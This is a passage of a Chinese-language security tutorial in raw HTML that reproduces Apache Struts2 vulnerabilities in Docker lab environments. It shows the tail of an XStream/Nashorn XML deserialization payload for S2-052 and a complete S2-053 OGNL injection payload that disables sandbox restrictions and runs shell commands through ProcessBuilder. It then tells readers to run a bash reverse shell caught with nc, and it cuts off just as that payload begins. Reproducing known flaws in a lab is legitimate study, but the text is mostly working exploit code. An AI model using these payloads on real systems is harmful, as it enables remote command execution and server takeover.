style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;consumed&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">false</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/consumed&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/dataSource&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;transferFlavors/&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/dataHandler&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;dataLen&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">0</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/dataLen&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/value&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;jdk.nashorn.internal.objects.NativeString</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">reference</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"../jdk.nashorn.internal.objects.NativeString"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">/&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/entry&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;entry&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;jdk.nashorn.internal.objects.NativeString</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">reference</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"../../entry/jdk.nashorn.internal.objects.NativeString"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">/&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;jdk.nashorn.internal.objects.NativeString</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">reference</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"../../entry/jdk.nashorn.internal.objects.NativeString"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">/&gt;</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/entry&gt;</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/map&gt;</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">首先将Content-Type改为<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">application/xml</code>，然后将xml文件插入，发包返回500证明已经成功</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/51_bw7ZqKV7yo97ZY3yuJKKcMVbXdUYLA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wIgeefyMO4iaH2BlkdMtlP3Uh2bw7ZqKV7yo97ZY3yuJKKcMVbXdUYLA/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/52_GuSibGcBxGU6ar6v2AZPgicOvKQQng.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wAz6vO8TOB8eYCSQF6qHEpt1ib5eGuSibGcBxGU6ar6v2AZPgicOvKQQng/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入tmp目录查看success文件已经创建成功</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.40625" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/53_KHuCHFI4UCzUntL7AhfJRd19KfEHgQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wkfEic9mfFj5OGs0YFSOf85hwUKHuCHFI4UCzUntL7AhfJRd19KfEHgQ/640?wx_fmt=png'" data-type="png" data-w="448" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-053</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">s2-053漏洞产生的原因是Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-053的docker环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6027522935779817" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/54_yfXia5ibib8dsFRFALP4GAbdSFv1bA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wajtSh0PnunKtoX6ibvHWFwxzicTZxyfXia5ibib8dsFRFALP4GAbdSFv1bA/640?wx_fmt=png'" data-type="png" data-w="1090" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">首先执行<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">%{33-1}</code>并提交，可以看到在Your url的地方运算出了结果，说明存在漏洞</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5633047210300429" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/55_xj1jHdDQJHkZptHeCCpT4x6IyDAbXA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wdDo8iajSzBI0U4VllWUw69NtUxj1jHdDQJHkZptHeCCpT4x6IyDAbXA/640?wx_fmt=png'" data-type="png" data-w="932" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">构造payload输出id并提交</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="java" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%{(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@ognl</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">OgnlContext@DEFAULT_MEMBER_ACCESS</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">_memberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">?(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">_memberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">):((#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">container</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'com.opensymphony.xwork2.ActionContext.container'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognlUtil</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">container</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@com</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">opensymphony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">xwork2</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognl</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">OgnlUtil@class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognlUtil</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getExcludedPackageNames</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">clear</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognlUtil</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getExcludedClasses</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">clear</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setMemberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)))).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cmd</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'id'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">iswin</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">System@getProperty</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'os.name'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">toLowerCase</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">contains</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'win'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">))).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cmds</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">iswin</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">?{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'cmd.exe'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'/c'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cmd</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}:{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'/bin/bash'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'-c'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cmd</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">})).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">p</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ProcessBuilder</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cmds</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">p</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">redirectErrorStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">true</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">process</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">p</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">start</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()).(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@org</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">apache</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">commons</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">IOUtils@toString</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">process</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInputStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()))}</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5915178571428571" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/56_2snVN6DteE8Y0Zib0KGILCMSd1Pmmg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5w526Sia722VxrjkAoF5unrM8FCG2snVN6DteE8Y0Zib0KGILCMSd1Pmmg/640?wx_fmt=png'" data-type="png" data-w="896" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">执行bash反弹命令，用nc监听端口即可得到反弹shell</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="java" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%{(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@ognl</span><span 